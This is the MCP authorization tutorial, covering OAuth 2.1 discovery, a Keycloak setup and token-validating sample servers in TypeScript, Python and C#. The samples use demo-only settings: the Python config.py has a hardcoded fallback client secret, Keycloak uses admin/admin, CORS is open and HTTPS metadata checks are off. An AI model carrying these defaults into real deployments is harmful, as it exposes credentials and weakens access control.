# MCP Documentation -- 03 Security Auth

- Understanding Authorization in MCP
- Security Best Practices
- Data exfiltration
- Privilege escalation
- Enterprise-Managed Authorization
- OAuth Client Credentials
- Authorization Extensions

---

# Understanding Authorization in MCP
Source: https://modelcontextprotocol.io/docs/tutorials/security/authorization

Learn how to implement secure authorization for MCP servers using OAuth 2.1 to protect sensitive resources and operations

Authorization in the Model Context Protocol (MCP) secures access to sensitive resources and operations exposed by MCP servers. If your MCP server handles user data or administrative actions, authorization ensures only permitted users can access its endpoints.

MCP uses standardized authorization flows to build trust between MCP clients and MCP servers. Its design doesn't focus on one specific authorization or identity system, but rather follows the conventions outlined for [OAuth 2.1](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-1-13). For detailed information, see the [Authorization specification](/specification/latest/basic/authorization).

## When Should You Use Authorization?

While authorization for MCP servers is **optional**, it is strongly recommended when:

* Your server accesses user-specific data (emails, documents, databases)
* You need to audit who performed which actions
* Your server grants access to its APIs that require user consent
* You're building for enterprise environments with strict access controls
* You want to implement rate limiting or usage tracking per user

  **Authorization for Local MCP Servers**

  For MCP servers using the [STDIO transport](/specification/latest/basic/transports#stdio), you can use environment-based credentials or credentials provided by third-party libraries embedded directly in the MCP server instead. Because a STDIO-built MCP server runs locally, it has access to a range of flexible options when it comes to acquiring user credentials that may or may not rely on in-browser authentication and authorization flows.

  OAuth flows, in turn, are designed for HTTP-based transports where the MCP server is remotely-hosted and the client uses OAuth to establish that a user is authorized to access said remote server.

## The Authorization Flow: Step by Step

Let's walk through what happens when a client wants to connect to your protected MCP server:

  
    When your MCP client first tries to connect, your server responds with a `401 Unauthorized` and tells the client where to find authorization information, captured in a [Protected Resource Metadata (PRM) document](https://datatracker.ietf.org/doc/html/rfc9728). The document is hosted by the MCP server, follows a predictable path pattern, and is provided to the client in the `resource_metadata` parameter within the `WWW-Authenticate` header.

    ```http 
    HTTP/1.1 401 Unauthorized
    WWW-Authenticate: Bearer realm="mcp",
      resource_metadata="https://your-server.com/.well-known/oauth-protected-resource"
    ```

    This tells the client that authorization is required for the MCP server and where to get the necessary information to kickstart the authorization flow.
  

  
    With the URI pointer to the PRM document, the client will fetch the metadata to learn about the authorization server, supported scopes, and other resource information. The data is typically encapsulated in a JSON blob, similar to the one below.

    ```json 
    {
      "resource": "https://your-server.com/mcp",
      "authorization_servers": ["https://auth.your-server.com"],
      "scopes_supported": ["mcp:tools", "mcp:resources"]
    }
    ```

    You can see a more comprehensive example in [RFC 9728 Section 3.2](https://datatracker.ietf.org/doc/html/rfc9728#name-protected-resource-metadata-r).
  

  
    Next, the client discovers what the authorization server can do by fetching its metadata. If the PRM document lists more than one authorization server, the client can decide which one to use.

    With an authorization server selected, the client will then construct a standard metadata URI and issue a request to the [OpenID Connect (OIDC) Discovery](https://openid.net/specs/openid-connect-discovery-1_0.html) or [OAuth 2.0 Auth Server Metadata](https://datatracker.ietf.org/doc/html/rfc8414) endpoints (depending on authorization server support)
    and retrieve another set of metadata properties that will allow it to know the endpoints it needs to complete the authorization flow.

    ```json 
    {
      "issuer": "https://auth.your-server.com",
      "authorization_endpoint": "https://auth.your-server.com/authorize",
      "token_endpoint": "https://auth.your-server.com/token",
      "registration_endpoint": "https://auth.your-server.com/register"
    }
    ```
  

  
    With all the metadata out of the way, the client now needs to make sure that it's registered with the authorization server. This can be done in two ways.

    First, the client can be **pre-registered** with a given authorization server, in which case it can have embedded client registration information that it uses to complete the authorization flow.

    Alternatively, the client can use **Dynamic Client Registration** (DCR) to dynamically register itself with the authorization server. The latter scenario requires the authorization server to support DCR. If the authorization server does support DCR, the client will send a request to the `registration_endpoint` with its information:

    ```json 
    {
      "client_name": "My MCP Client",
      "redirect_uris": ["http://localhost:3000/callback"],
      "grant_types": ["authorization_code", "refresh_token"],
      "response_types": ["code"]
    }
    ```

    If the registration succeeds, the authorization server will return a JSON blob with client registration information.

    
      **No DCR or Pre-Registration**

      In case an MCP client connects to an MCP server that doesn't use an authorization server that supports DCR and the client is not pre-registered with said authorization server, it's the responsibility of the client developer to provide an affordance for the end-user to enter client information manually.
    
  

  
    The client will now need to open a browser to the `/authorize` endpoint, where the user can log in and grant the required permissions. The authorization server will then redirect back to the client with an authorization code that the client exchanges for tokens:

    ```json 
    {
      "access_token": "eyJhbGciOiJSUzI1NiIs...",
      "refresh_token": "def502...",
      "token_type": "Bearer",
      "expires_in": 3600
    }
    ```

    The access token is what the client will use to authenticate requests to the MCP server. This step follows standard [OAuth 2.1 authorization code with PKCE](https://oauth.net/2/grant-types/authorization-code/) conventions.
  

  
    Finally, the client can make requests to your MCP server using the access token embedded in the `Authorization` header:

    ```http 
    GET /mcp HTTP/1.1
    Host: your-server.com
    Authorization: Bearer eyJhbGciOiJSUzI1NiIs...
    ```

    The MCP server will need to validate the token and process the request if the token is valid and has the required permissions.
  

## Implementation Example

To get started with a practical implementation, we will use a [Keycloak](https://www.keycloak.org/) authorization server hosted in a Docker container. Keycloak is an open-source authorization server that can be easily deployed locally for testing and experimentation.

Make sure that you download and install [Docker Desktop](https://www.docker.com/products/docker-desktop/). We will need it to deploy Keycloak on our development machine.

### Keycloak Setup

From your terminal application, run the following command to start the Keycloak container:

```bash 
docker run -p 127.0.0.1:8080:8080 -e KC_BOOTSTRAP_ADMIN_USERNAME=admin -e KC_BOOTSTRAP_ADMIN_PASSWORD=admin quay.io/keycloak/keycloak start-dev
```

This command will pull the Keycloak container image locally and bootstrap the basic configuration. It will run on port `8080` and have an `admin` user with `admin` password.

  **Not for Production**

  The configuration above may be suitable for testing and experimentation; however, you should never use it in production. Refer to the [Configuring Keycloak for production](https://www.keycloak.org/server/configuration-production) guide for additional details on how to deploy the authorization server for scenarios that require reliability, security, and high availability.

You will be able to access the Keycloak authorization server from your browser at `http://localhost:8080`.

  
[Image: Keycloak admin dashboard authentication dialog.]

When running with the default configuration, Keycloak will already support many of the capabilities that we need for MCP servers, including Dynamic Client Registration. You can check this by looking at the OIDC configuration, available at:

```http 
http://localhost:8080/realms/master/.well-known/openid-configuration
```

We will also need to set up Keycloak to support our scopes and allow our host (local machine) to dynamically register clients, as the default policies restrict anonymous dynamic client registration.

Go to **Client scopes** in the Keycloak dashboard and create a new `mcp:tools` scope. We will use this to access all of the tools on our MCP server.

  
[Image: Configuring Keycloak scopes.]

After creating the scope, make sure that you assign its type to **Default** and have flipped the **Include in token scope** switch, as this will be needed for token validation.

Let's now also set up an **audience** for our Keycloak-issued tokens. An audience is important to configure because it embeds the intended destination directly into the issued access token. This helps your MCP server to verify that the token it got was actually meant for it rather than some other API. This is key to help avoid token passthrough scenarios.

To do this, open your `mcp:tools` client scope and click on **Mappers**, followed by **Configure a new mapper**. Select **Audience**.

  
[Image: Configuring an audience for a token in Keycloak.]

For **Name**, use `audience-config`. Add a value for **Included Custom Audience**, set to `http://localhost:3000`. This will be the URI of our test server.

  **Not for Production**

  The audience configuration above is meant for testing. For production scenarios, additional set-up and configuration will be required to ensure that audiences are properly constrained for issued tokens. Specifically, the audience needs to be based on the resource parameter passed from the client, not a fixed value.

Now, navigate to **Clients**, then **Client registration**, and then **Trusted Hosts**. Disable the **Client URIs Must Match** setting and add the hosts from which you're testing. You can get your current host IP by running the `ifconfig` command on Linux or macOS, or `ipconfig` on Windows. You can see the IP address you need to add by looking at the keycloak logs for a line that looks like `Failed to verify remote host : 192.168.215.1`. Check that the IP address is associated with your host. This may be for a bridge network depending on your docker setup.

  
[Image: Setting up client registration details in Keycloak.]

  **Getting the Host**

  If you are running Keycloak from a container, you will also be able to see the host IP from the Terminal in the container logs.

Lastly, we need to register a new client that we can use with the **MCP server itself** to talk to Keycloak for things like [token introspection](https://oauth.net/2/token-introspection/). To do that:

1. Go to **Clients**.
2. Click **Create client**.
3. Give your client a unique **Client ID** and click **Next**.
4. Enable **Client authentication** and click **Next**.
5. Click **Save**.

Worth noting that token introspection is just *one of* the available approaches to validate tokens. This can also be done with the help of standalone libraries, specific to each language and platform.

When you open the client details, go to **Credentials** and take note of the **Client Secret**.

  
[Image: Creating a new client in Keycloak.]

  **Handling Secrets**

  Never embed client credentials directly in your code. We recommend using environment variables or specialized solutions for secret storage.

With Keycloak configured, every time the authorization flow is triggered, your MCP server will receive a token like this:

```text 
eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICI1TjcxMGw1WW5MWk13WGZ1VlJKWGtCS3ZZMzZzb3JnRG5scmlyZ2tlTHlzIn0.eyJleHAiOjE3NTU1NDA4MTcsImlhdCI6MTc1NTU0MDc1NywiYXV0aF90aW1lIjoxNzU1NTM4ODg4LCJqdGkiOiJvbnJ0YWM6YjM0MDgwZmYtODQwNC02ODY3LTgxYmUtMTIzMWI1MDU5M2E4IiwiaXNzIjoiaHR0cDovL2xvY2FsaG9zdDo4MDgwL3JlYWxtcy9tYXN0ZXIiLCJhdWQiOiJodHRwOi8vbG9jYWxob3N0OjMwMDAiLCJzdWIiOiIzM2VkNmM2Yi1jNmUwLTQ5MjgtYTE2MS1mMmY2OWM3YTAzYjkiLCJ0eXAiOiJCZWFyZXIiLCJhenAiOiI3OTc1YTViNi04YjU5LTRhODUtOWNiYS04ZmFlYmRhYjg5NzQiLCJzaWQiOiI4ZjdlYzI3Ni0zNThmLTRjY2MtYjMxMy1kYjA4MjkwZjM3NmYiLCJzY29wZSI6Im1jcDp0b29scyJ9.P5xCRtXORly0R0EXjyqRCUx-z3J4uAOWNAvYtLPXroykZuVCCJ-K1haiQSwbURqfsVOMbL7jiV-sD6miuPzI1tmKOkN_Yct0Vp-azvj7U5rEj7U6tvPfMkg2Uj_jrIX0KOskyU2pVvGZ-5BgqaSvwTEdsGu_V3_E0xDuSBq2uj_wmhqiyTFm5lJ1WkM3Hnxxx1_AAnTj7iOKMFZ4VCwMmk8hhSC7clnDauORc0sutxiJuYUZzxNiNPkmNeQtMCGqWdP1igcbWbrfnNXhJ6NswBOuRbh97_QraET3hl-CNmyS6C72Xc0aOwR_uJ7xVSBTD02OaQ1JA6kjCATz30kGYg
```

Decoded, it will look like this:

```json 
{
  "alg": "RS256",
  "typ": "JWT",
  "kid": "5N710l5YnLZMwXfuVRJXkBKvY36sorgDnlrirgkeLys"
}.{
  "exp": 1755540817,
  "iat": 1755540757,
  "auth_time": 1755538888,
  "jti": "onrtac:b34080ff-8404-6867-81be-1231b50593a8",
  "iss": "http://localhost:8080/realms/master",
  "aud": "http://localhost:3000",
  "sub": "33ed6c6b-c6e0-4928-a161-f2f69c7a03b9",
  "typ": "Bearer",
  "azp": "7975a5b6-8b59-4a85-9cba-8faebdab8974",
  "sid": "8f7ec276-358f-4ccc-b313-db08290f376f",
  "scope": "mcp:tools"
}.[Signature]
```

  **Embedded Audience**

  Notice the `aud` claim embedded in the token - it's currently set to be the URI of the test MCP server and it's inferred from the scope that we've previously configured. This will be important in our implementation to validate.

### MCP Server Setup

We will now set up our MCP server to use the locally-running Keycloak authorization server. Depending on your programming language preference, you can use one of the supported [MCP SDKs](/docs/sdk).

For our testing purposes, we will create an extremely simple MCP server that exposes two tools - one for addition and another for multiplication. The server will require authorization to access these.

  
    You can see the complete TypeScript project in the [sample repository](https://github.com/localden/min-ts-mcp-auth).

    Prior to running the code below, ensure that you have a `.env` file with the following content:

    ```env 
    # Server host/port
    HOST=localhost
    PORT=3000

    # Auth server location
    AUTH_HOST=localhost
    AUTH_PORT=8080
    AUTH_REALM=master

    # Keycloak OAuth client credentials
    OAUTH_CLIENT_ID=<YOUR_SERVER_CLIENT_ID>
    OAUTH_CLIENT_SECRET=<YOUR_SERVER_CLIENT_SECRET>
    ```

    `OAUTH_CLIENT_ID` and `OAUTH_CLIENT_SECRET` are associated with the MCP server client we created earlier.

    In addition to implementing the MCP authorization specification, the server below also does token introspection via Keycloak to make sure that the token it receives from the client is valid. It also implements basic logging to allow you to easily diagnose any issues.

    ```typescript 
    import "dotenv/config";
    import express from "express";
    import { randomUUID } from "node:crypto";
    import { McpServer } from "@modelcontextprotocol/sdk/server/mcp.js";
    import { StreamableHTTPServerTransport } from "@modelcontextprotocol/sdk/server/streamableHttp.js";
    import { isInitializeRequest } from "@modelcontextprotocol/sdk/types.js";
    import { z } from "zod";
    import cors from "cors";
    import {
      mcpAuthMetadataRouter,
      getOAuthProtectedResourceMetadataUrl,
    } from "@modelcontextprotocol/sdk/server/auth/router.js";
    import { requireBearerAuth } from "@modelcontextprotocol/sdk/server/auth/middleware/bearerAuth.js";
    import { OAuthMetadata } from "@modelcontextprotocol/sdk/shared/auth.js";
    import { checkResourceAllowed } from "@modelcontextprotocol/sdk/shared/auth-utils.js";
    const CONFIG = {
      host: process.env.HOST || "localhost",
      port: Number(process.env.PORT) || 3000,
      auth: {
        host: process.env.AUTH_HOST || process.env.HOST || "localhost",
        port: Number(process.env.AUTH_PORT) || 8080,
        realm: process.env.AUTH_REALM || "master",
        clientId: process.env.OAUTH_CLIENT_ID || "mcp-server",
        clientSecret: process.env.OAUTH_CLIENT_SECRET || "",
      },
    };

    function createOAuthUrls() {
      const authBaseUrl = new URL(
        `http://${CONFIG.auth.host}:${CONFIG.auth.port}/realms/${CONFIG.auth.realm}/`,
      );
      return {
        issuer: authBaseUrl.toString(),
        introspection_endpoint: new URL(
          "protocol/openid-connect/token/introspect",
          authBaseUrl,
        ).toString(),
        authorization_endpoint: new URL(
          "protocol/openid-connect/auth",
          authBaseUrl,
        ).toString(),
        token_endpoint: new URL(
          "protocol/openid-connect/token",
          authBaseUrl,
        ).toString(),
      };
    }

    function createRequestLogger() {
      return (req: any, res: any, next: any) => {
        const start = Date.now();
        res.on("finish", () => {
          const ms = Date.now() - start;
          console.log(
            `${req.method} ${req.originalUrl} -> ${res.statusCode} ${ms}ms`,
          );
        });
        next();
      };
    }

    const app = express();

    app.use(
      express.json({
        verify: (req: any, _res, buf) => {
          req.rawBody = buf?.toString() ?? "";
        },
      }),
    );

    app.use(
      cors({
        origin: "*",
        exposedHeaders: ["Mcp-Session-Id"],
      }),
    );

    app.use(createRequestLogger());

    const mcpServerUrl = new URL(`http://${CONFIG.host}:${CONFIG.port}`);
    const oauthUrls = createOAuthUrls();

    const oauthMetadata: OAuthMetadata = {
      ...oauthUrls,
      response_types_supported: ["code"],
    };

    const tokenVerifier = {
      verifyAccessToken: async (token: string) => {
        const endpoint = oauthMetadata.introspection_endpoint;

        if (!endpoint) {
          console.error("[auth] no introspection endpoint in metadata");
          throw new Error("No token verification endpoint available in metadata");
        }

        const params = new URLSearchParams({
          token: token,
          client_id: CONFIG.auth.clientId,
        });

        if (CONFIG.auth.clientSecret) {
          params.set("client_secret", CONFIG.auth.clientSecret);
        }

        let response: Response;
        try {
          response = await fetch(endpoint, {
            method: "POST",
            headers: {
              "Content-Type": "application/x-www-form-urlencoded",
            },
            body: params.toString(),
          });
        } catch (e) {
          console.error("[auth] introspection fetch threw", e);
          throw e;
        }

        if (!response.ok) {
          const txt = await response.text();
          console.error("[auth] introspection non-OK", { status: response.status });

          try {
            const obj = JSON.parse(txt);
            console.log(JSON.stringify(obj, null, 2));
          } catch {
            console.error(txt);
          }
          throw new Error(`Invalid or expired token: ${txt}`);
        }

        let data: any;
        try {
          data = await response.json();
        } catch (e) {
          const txt = await response.text();
          console.error("[auth] failed to parse introspection JSON", {
            error: String(e),
            body: txt,
          });
          throw e;
        }

        if (data.active === false) {
          throw new Error("Inactive token");
        }

        if (!data.aud) {
          throw new Error("Resource indicator (aud) missing");
        }

        const audiences: string[] = Array.isArray(data.aud) ? data.aud : [data.aud];
        const allowed = audiences.some((a) =>
          checkResourceAllowed({
            requestedResource: a,
            configuredResource: mcpServerUrl,
          }),
        );
        if (!allowed) {
          throw new Error(
            `None of the provided audiences are allowed. Expected ${mcpServerUrl}, got: ${audiences.join(", ")}`,
          );
        }

        return {
          token,
          clientId: data.client_id,
          scopes: data.scope ? data.scope.split(" ") : [],
          expiresAt: data.exp,
        };
      },
    };
    app.use(
      mcpAuthMetadataRouter({
        oauthMetadata,
        resourceServerUrl: mcpServerUrl,
        scopesSupported: ["mcp:tools"],
        resourceName: "MCP Demo Server",
      }),
    );

    const authMiddleware = requireBearerAuth({
      verifier: tokenVerifier,
      requiredScopes: [],
      resourceMetadataUrl: getOAuthProtectedResourceMetadataUrl(mcpServerUrl),
    });

    const transports: { [sessionId: string]: StreamableHTTPServerTransport } = {};

    function createMcpServer() {
      const server = new McpServer({
        name: "example-server",
        version: "1.0.0",
      });

      server.registerTool(
        "add",
        {
          title: "Addition Tool",
          description: "Add two numbers together",
          inputSchema: {
            a: z.number().describe("First number to add"),
            b: z.number().describe("Second number to add"),
          },
        },
        async ({ a, b }) => ({
          content: [{ type: "text", text: `${a} + ${b} = ${a + b}` }],
        }),
      );

      server.registerTool(
        "multiply",
        {
          title: "Multiplication Tool",
          description: "Multiply two numbers together",
          inputSchema: {
            x: z.number().describe("First number to multiply"),
            y: z.number().describe("Second number to multiply"),
          },
        },
        async ({ x, y }) => ({
          content: [{ type: "text", text: `${x} × ${y} = ${x * y}` }],
        }),
      );

      return server;
    }

    const mcpPostHandler = async (req: express.Request, res: express.Response) => {
      const sessionId = req.headers["mcp-session-id"] as string | undefined;
      let transport: StreamableHTTPServerTransport;

      if (sessionId && transports[sessionId]) {
        transport = transports[sessionId];
      } else if (!sessionId && isInitializeRequest(req.body)) {
        transport = new StreamableHTTPServerTransport({
          sessionIdGenerator: () => randomUUID(),
          onsessioninitialized: (sessionId) => {
            transports[sessionId] = transport;
          },
        });

        transport.onclose = () => {
          if (transport.sessionId) {
            delete transports[transport.sessionId];
          }
        };

        const server = createMcpServer();
        await server.connect(transport);
      } else {
        res.status(400).json({
          jsonrpc: "2.0",
          error: {
            code: -32000,
            message: "Bad Request: No valid session ID provided",
          },
          id: null,
        });
        return;
      }

      await transport.handleRequest(req, res, req.body);
    };

    const handleSessionRequest = async (
      req: express.Request,
      res: express.Response,
    ) => {
      const sessionId = req.headers["mcp-session-id"] as string | undefined;
      if (!sessionId || !transports[sessionId]) {
        res.status(400).send("Invalid or missing session ID");
        return;
      }

      const transport = transports[sessionId];
      await transport.handleRequest(req, res);
    };

    app.post("/", authMiddleware, mcpPostHandler);
    app.get("/", authMiddleware, handleSessionRequest);
    app.delete("/", authMiddleware, handleSessionRequest);

    app.listen(CONFIG.port, CONFIG.host, () => {
      console.log(`🚀 MCP Server running on ${mcpServerUrl.origin}`);
      console.log(`📡 MCP endpoint available at ${mcpServerUrl.origin}`);
      console.log(
        `🔐 OAuth metadata available at ${getOAuthProtectedResourceMetadataUrl(mcpServerUrl)}`,
      );
    });
    ```

    When you run the server, you can add it to your MCP client, such as Visual Studio Code, by providing the MCP server endpoint.

    For more details about implementing MCP servers in TypeScript, refer to the [TypeScript SDK documentation](https://github.com/modelcontextprotocol/typescript-sdk).
  

  
    You can see the complete Python project in the [sample repository](https://github.com/localden/min-py-mcp-auth).

    To simplify our authorization interaction, in Python scenarios we rely on [FastMCP](https://gofastmcp.com/getting-started/welcome). Many of the conventions around authorization, like the endpoints and token validation logic, are consistent across languages, but some offer simpler ways of integrating them in production scenarios.

    Prior to writing the actual server, we need to set up our configuration in `config.py` - the contents are entirely based on your local server setup:

    ```python 
    """Configuration settings for the MCP auth server."""

    import os
    from typing import Optional

    class Config:
        """Configuration class that loads from environment variables with sensible defaults."""

        # Server settings
        HOST: str = os.getenv("HOST", "localhost")
        PORT: int = int(os.getenv("PORT", "3000"))

        # Auth server settings
        AUTH_HOST: str = os.getenv("AUTH_HOST", "localhost")
        AUTH_PORT: int = int(os.getenv("AUTH_PORT", "8080"))
        AUTH_REALM: str = os.getenv("AUTH_REALM", "master")

        # OAuth client settings
        OAUTH_CLIENT_ID: str = os.getenv("OAUTH_CLIENT_ID", "mcp-server")
        OAUTH_CLIENT_SECRET: str = os.getenv("OAUTH_CLIENT_SECRET", "UO3rmozkFFkXr0QxPTkzZ0LMXDidIikB")

        # Server settings
        MCP_SCOPE: str = os.getenv("MCP_SCOPE", "mcp:tools")
        OAUTH_STRICT: bool = os.getenv("OAUTH_STRICT", "false").lower() in ("true", "1", "yes")
        TRANSPORT: str = os.getenv("TRANSPORT", "streamable-http")

        @property
        def server_url(self) -> str:
            """Build the server URL."""
            return f"http://{self.HOST}:{self.PORT}"

        @property
        def auth_base_url(self) -> str:
            """Build the auth server base URL."""
            return f"http://{self.AUTH_HOST}:{self.AUTH_PORT}/realms/{self.AUTH_REALM}/"

        def validate(self) -> None:
            """Validate configuration."""
            if self.TRANSPORT not in ["sse", "streamable-http"]:
                raise ValueError(f"Invalid transport: {self.TRANSPORT}. Must be 'sse' or 'streamable-http'")

    # Global configuration instance
    config = Config()

    ```

    The server implementation is as follows:

    ```python 
    import datetime
    import logging
    from typing import Any

    from pydantic import AnyHttpUrl

    from mcp.server.auth.settings import AuthSettings
    from mcp.server.fastmcp.server import FastMCP

    from .config import config
    from .token_verifier import IntrospectionTokenVerifier

    logger = logging.getLogger(__name__)

    def create_oauth_urls() -> dict[str, str]:
        """Create OAuth URLs based on configuration (Keycloak-style)."""
        from urllib.parse import urljoin

        auth_base_url = config.auth_base_url

        return {
            "issuer": auth_base_url,
            "introspection_endpoint": urljoin(auth_base_url, "protocol/openid-connect/token/introspect"),
            "authorization_endpoint": urljoin(auth_base_url, "protocol/openid-connect/auth"),
            "token_endpoint": urljoin(auth_base_url, "protocol/openid-connect/token"),
        }

    def create_server() -> FastMCP:
        """Create and configure the FastMCP server."""

        config.validate()

        oauth_urls = create_oauth_urls()

        token_verifier = IntrospectionTokenVerifier(
            introspection_endpoint=oauth_urls["introspection_endpoint"],
            server_url=config.server_url,
            client_id=config.OAUTH_CLIENT_ID,
            client_secret=config.OAUTH_CLIENT_SECRET,
        )

        app = FastMCP(
            name="MCP Resource Server",
            instructions="Resource Server that validates tokens via Authorization Server introspection",
            host=config.HOST,
            port=config.PORT,
            debug=True,
            streamable_http_path="/",
            token_verifier=token_verifier,
            auth=AuthSettings(
                issuer_url=AnyHttpUrl(oauth_urls["issuer"]),
                required_scopes=[config.MCP_SCOPE],
                resource_server_url=AnyHttpUrl(config.server_url),
            ),
        )

        @app.tool()
        async def add_numbers(a: float, b: float) -> dict[str, Any]:
            """
            Add two numbers together.
            This tool demonstrates basic arithmetic operations with OAuth authentication.

            Args:
                a: The first number to add
                b: The second number to add
            """
            result = a + b
            return {
                "operation": "addition",
                "operand_a": a,
                "operand_b": b,
                "result": result,
                "timestamp": datetime.datetime.now().isoformat()
            }

        @app.tool()
        async def multiply_numbers(x: float, y: float) -> dict[str, Any]:
            """
            Multiply two numbers together.
            This tool demonstrates basic arithmetic operations with OAuth authentication.

            Args:
                x: The first number to multiply
                y: The second number to multiply
            """
            result = x * y
            return {
                "operation": "multiplication",
                "operand_x": x,
                "operand_y": y,
                "result": result,
                "timestamp": datetime.datetime.now().isoformat()
            }

        return app

    def main() -> int:
        """
        Run the MCP Resource Server.

        This server:
        - Provides RFC 9728 Protected Resource Metadata
        - Validates tokens via Authorization Server introspection
        - Serves MCP tools requiring authentication

        Configuration is loaded from config.py and environment variables.
        """
        logging.basicConfig(level=logging.INFO)

        try:
            config.validate()
            oauth_urls = create_oauth_urls()

        except ValueError as e:
            logger.error("Configuration error: %s", e)
            return 1

        try:
            mcp_server = create_server()

            logger.info("Starting MCP Server on %s:%s", config.HOST, config.PORT)
            logger.info("Authorization Server: %s", oauth_urls["issuer"])
            logger.info("Transport: %s", config.TRANSPORT)

            mcp_server.run(transport=config.TRANSPORT)
            return 0

        except Exception:
            logger.exception("Server error")
            return 1

    if __name__ == "__main__":
        exit(main())
    ```

    Lastly, the token verification logic is delegated entirely to `token_verifier.py`, ensuring that we can use the Keycloak introspection endpoint to verify the validity of any credential artifacts

    ```python 
    """Token verifier implementation using OAuth 2.0 Token Introspection (RFC 7662)."""

    import logging
    from typing import Any

    from mcp.server.auth.provider import AccessToken, TokenVerifier
    from mcp.shared.auth_utils import check_resource_allowed, resource_url_from_server_url

    logger = logging.getLogger(__name__)

    class IntrospectionTokenVerifier(TokenVerifier):
        """Token verifier that uses OAuth 2.0 Token Introspection (RFC 7662).
        """

        def __init__(
            self,
            introspection_endpoint: str,
            server_url: str,
            client_id: str,
            client_secret: str,
        ):
            self.introspection_endpoint = introspection_endpoint
            self.server_url = server_url
            self.client_id = client_id
            self.client_secret = client_secret
            self.resource_url = resource_url_from_server_url(server_url)

        async def verify_token(self, token: str) -> AccessToken | None:
            """Verify token via introspection endpoint."""
            import httpx

            if not self.introspection_endpoint.startswith(("https://", "http://localhost", "http://127.0.0.1")):
                return None

            timeout = httpx.Timeout(10.0, connect=5.0)
            limits = httpx.Limits(max_connections=10, max_keepalive_connections=5)

            async with httpx.AsyncClient(
                timeout=timeout,
                limits=limits,
                verify=True,
            ) as client:
                try:
                    form_data = {
                        "token": token,
                        "client_id": self.client_id,
                        "client_secret": self.client_secret,
                    }
                    headers = {"Content-Type": "application/x-www-form-urlencoded"}

                    response = await client.post(
                        self.introspection_endpoint,
                        data=form_data,
                        headers=headers,
                    )

                    if response.status_code != 200:
                        return None

                    data = response.json()
                    if not data.get("active", False):
                        return None

                    if not self._validate_resource(data):
                        return None

                    return AccessToken(
                        token=token,
                        client_id=data.get("client_id", "unknown"),
                        scopes=data.get("scope", "").split() if data.get("scope") else [],
                        expires_at=data.get("exp"),
                        resource=data.get("aud"),  # Include resource in token
                    )

                except Exception as e:
                    return None

        def _validate_resource(self, token_data: dict[str, Any]) -> bool:
            """Validate token was issued for this resource server.

            Rules:
            - Reject if 'aud' missing.
            - Accept if any audience entry matches the derived resource URL.
            - Supports string or list forms per JWT spec.
            """
            if not self.server_url or not self.resource_url:
                return False

            aud: list[str] | str | None = token_data.get("aud")
            if isinstance(aud, list):
                return any(self._is_valid_resource(a) for a in aud)
            if isinstance(aud, str):
                return self._is_valid_resource(aud)
            return False

        def _is_valid_resource(self, resource: str) -> bool:
            """Check if the given resource matches our server."""
            return check_resource_allowed(self.resource_url, resource)
    ```

    For more details, see the [Python SDK documentation](https://github.com/modelcontextprotocol/python-sdk).
  

  
    You can see the complete C# project in the [sample repository](https://github.com/localden/min-cs-mcp-auth).

    To set up authorization in your MCP server using the MCP C# SDK, you can lean on the standard ASP.NET Core builder pattern. Instead of using the introspection endpoint provided by Keycloak, we will use built-in ASP.NET Core capabilities for token validation.

    ```csharp 
    using Microsoft.AspNetCore.Authentication.JwtBearer;
    using Microsoft.IdentityModel.Tokens;
    using ModelContextProtocol.AspNetCore.Authentication;
    using ProtectedMcpServer.Tools;
    using System.Security.Claims;

    var builder = WebApplication.CreateBuilder(args);

    var serverUrl = "http://localhost:3000/";
    var authorizationServerUrl = "http://localhost:8080/realms/master/";

    builder.Services.AddAuthentication(options =>
    {
        options.DefaultChallengeScheme = McpAuthenticationDefaults.AuthenticationScheme;
        options.DefaultAuthenticateScheme = JwtBearerDefaults.AuthenticationScheme;
    })
    .AddJwtBearer(options =>
    {
        options.Authority = authorizationServerUrl;
        var normalizedServerAudience = serverUrl.TrimEnd('/');
        options.TokenValidationParameters = new TokenValidationParameters
        {
            ValidIssuer = authorizationServerUrl,
            ValidAudiences = new[] { normalizedServerAudience, serverUrl },
            AudienceValidator = (audiences, securityToken, validationParameters) =>
            {
                if (audiences == null) return false;
                foreach (var aud in audiences)
                {
                    if (string.Equals(aud.TrimEnd('/'), normalizedServerAudience, StringComparison.OrdinalIgnoreCase))
                    {
                        return true;
                    }
                }
                return false;
            }
        };

        options.RequireHttpsMetadata = false; // Set to true in production

        options.Events = new JwtBearerEvents
        {
            OnTokenValidated = context =>
            {
                var name = context.Principal?.Identity?.Name ?? "unknown";
                var email = context.Principal?.FindFirstValue("preferred_username") ?? "unknown";
                Console.WriteLine($"Token validated for: {name} ({email})");
                return Task.CompletedTask;
            },
            OnAuthenticationFailed = context =>
            {
                Console.WriteLine($"Authentication failed: {context.Exception.Message}");
                return Task.CompletedTask;
            },
        };
    })
    .AddMcp(options =>
    {
        options.ResourceMetadata = new()
        {
            Resource = new Uri(serverUrl),
            ResourceDocumentation = new Uri("https://docs.example.com/api/math"),
            AuthorizationServers = { new Uri(authorizationServerUrl) },
            ScopesSupported = ["mcp:tools"]
        };
    });

    builder.Services.AddAuthorization();

    builder.Services.AddHttpContextAccessor();
    builder.Services.AddMcpServer()
        .WithTools<MathTools>()
        .WithHttpTransport();

    var app = builder.Build();

    app.UseAuthentication();
    app.UseAuthorization();

    app.MapMcp().RequireAuthorization();

    Console.WriteLine($"Starting MCP server with authorization at {serverUrl}");
    Console.WriteLine($"Using Keycloak server at {authorizationServerUrl}");
    Console.WriteLine($"Protected Resource Metadata URL: {serverUrl}.well-known/oauth-protected-resource");
    Console.WriteLine("Exposed Math tools: Add, Multiply");
    Console.WriteLine("Press Ctrl+C to stop the server");

    app.Run(serverUrl);
    ```

    For more details, see the [C# SDK documentation](https://github.com/modelcontextprotocol/csharp-sdk).
  

## Testing the MCP Server

For testing purposes, we will be using [Visual Studio Code](https://code.visualstudio.com), but any client that supports MCP and the new authorization specification will fit.

Press <kbd>Cmd</kbd> + <kbd>Shift</kbd> + <kbd>P</kbd> and select **MCP: Add server...**. Select **HTTP** and enter `http://localhost:3000`. Give the server a unique name to be used inside Visual Studio Code. In `mcp.json` you should now see an entry like this:

```json 
"my-mcp-server-18676652": {
  "url": "http://localhost:3000",
  "type": "http"
}
```

On connection, you will be taken to the browser, where you will be prompted to consent to Visual Studio Code having access to the `mcp:tools` scope.

  
[Image: Keycloak consent form for VS Code.]

After consenting, you will see the tools listed right above the server entry in `mcp.json`.

  
[Image: Tools listed in VS Code.]

You will be able to invoke individual tools with the help of the `#` sign in the chat view.

  
[Image: Invoking MCP tools in VS Code.]

